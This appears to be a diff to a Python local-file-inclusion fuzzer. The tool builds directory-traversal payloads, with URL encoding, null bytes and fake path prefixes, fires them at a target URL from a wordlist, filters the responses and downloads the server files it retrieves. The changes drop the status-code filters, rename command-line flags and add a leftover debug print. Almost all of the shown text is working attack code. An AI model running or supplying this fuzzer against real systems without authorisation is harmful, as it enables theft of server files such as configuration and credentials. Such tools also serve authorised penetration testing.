@@ -47,7 +47,7 @@ def generate_traversal(method, nb):
 
 
 def build_payload(filename, nb_parent = 10, urlencode = 0, path_prefix = "",
-                append_null = False, traversal_method=0, var=''):
+                    append_null = False, traversal_method=0, var=''):
 
     #evade_remove_backpath = False
     null = "\x00"
@@ -83,14 +83,8 @@ def check_url(base_url, payload):
     return requests.get(base_url + payload)
 
 
-def check_result(result, status = None, error_status = None, min_length = None, success_string = None, error_string = None):
+def check_result(result, min_length = None, success_string = None, error_string = None):
     check = True
-
-    if status is not None and result.status_code not in status:
-        check = False
-
-    if error_status is not None and result.status_code in error_status:
-        check = False
 
     if min_length is not None and len(result.text) <= min_length:
         check = False
@@ -115,27 +109,28 @@ def download(result, payload, folder_dest):
 
 def main():
 
+
+    print(random_traversal(5))
+
     parser = argparse.ArgumentParser(description='LFI Fuzzer')
     parser.add_argument('-u', '--url', required=True, help='URL to fuzz')
     parser.add_argument('-w', '--wordlist', required=True)
 
     parser.add_argument('-p', '--nb_parent', type=int, default=10, help='Number of times going up in directory tree')
-    parser.add_argument('-c', '--urlencode', type=int, default=0, help='0 : no encoding, 1 : normal encoding, 2 : double encoding')
+    parser.add_argument('-e', '--urlencode', type=int, default=0, help='0 : no encoding, 1 : normal encoding, 2 : double encoding')
     parser.add_argument('-r', '--path_prefix', default='', help='Real of a fake path to prefix to payload')
     parser.add_argument('-n', '--append_null', action='store_true', help='Add a null char at the URL end')
     parser.add_argument('-m', '--traversal_method', type=int, default=0, help='Traversal method')
 
-    parser.add_argument('-t', '--stress', action='store_true', help='Try multiple method')
+    parser.add_argument('-s', '--stress', action='store_true', help='Try multiple method')
     parser.add_argument('-o', '--output', action='store_true', help='Output URLs to STDOUT instead of fetching them')
     parser.add_argument('-d', '--download', metavar='DIRECTORY', help='Download found files in this directory')
     parser.add_argument('-v', '--verbose', action='store_true', help='Show complete payloads')
-    parser.add_argument('-a', '--var', help='Show complete payloads')
+    parser.add_argument('-x', '--var', default='', help='Show complete payloads')
 
-    parser.add_argument('-s', '--status', default=[200], type=int, action='append', help='Status code allowed')
-    parser.add_argument('-e', '--error-status', default=[400,404,500], type=int, action='append', help='Status code to ignore')
-    parser.add_argument('-l', '--min-length', default='0', type=int, help='Minimum response length')
-    parser.add_argument('-ss', '--success-string', help='Success string to look for')
-    parser.add_argument('-es', '--error-string', help='Error/failure string to ignore')
+    parser.add_argument('-l', '--min_length', default='0', type=int, help='Minimum response length')
+    parser.add_argument('-ss', '--success_string', help='Success string to look for')
+    parser.add_argument('-es', '--error_string', help='Error/failure string to ignore')
 
     args = parser.parse_args()
 
@@ -158,13 +153,13 @@ def main():
 
                         payload = build_payload(filename, nb_parent=parent, urlencode=encode, path_prefix=prefix, append_null=False, traversal_method=method)
                         result = check_url(args.url, payload)
-                        if check_result(result, args.status, args.error_status, args.min_length, args.success_string, args.error_string):
-                            print(f'status {result.status_code}, length {len(result.text)}, payload {payload}')
+                        if check_result(result, args.min_length, args.success_string, args.error_string):
+                            print(f'length {len(result.text)}, payload {payload}')
 
                         payload = build_payload(filename, nb_parent=parent, urlencode=encode, path_prefix=prefix, append_null=True, traversal_method=method)
                         result = check_url(args.url, payload)
-                        if check_result(result, args.status, args.error_status, args.min_length, args.success_string, args.error_string):
-                            print(f'status {result.status_code}, length {len(result.text)}, payload {payload}')
+                        if check_result(result, args.min_length, args.success_string, args.error_string):
+                            print(f'length {len(result.text)}, payload {payload}')
 
         #We're done stressing
         exit()
@@ -198,12 +193,12 @@ def main():
             result = check_url(args.url, payload)
 
             #Only print results successfully passing test(s). No test = output every result
-            if check_result(result, args.status, args.error_status, args.min_length, args.success_string, args.error_string):
+            if check_result(result, args.min_length, args.success_string, args.error_string):
 
                 if args.verbose:
-                    print(f'{filename} : status {result.status_code}, length {len(result.text)}, payload {payload}')
+                    print(f'{filename} : length {len(result.text)}, payload {payload}')
                 else:
-                    print(f'{filename} : status {result.status_code}, length {len(result.text)}')
+                    print(f'{filename} : length {len(result.text)}')
                 
                 if args.download:
                     download(result, filename, args.download)
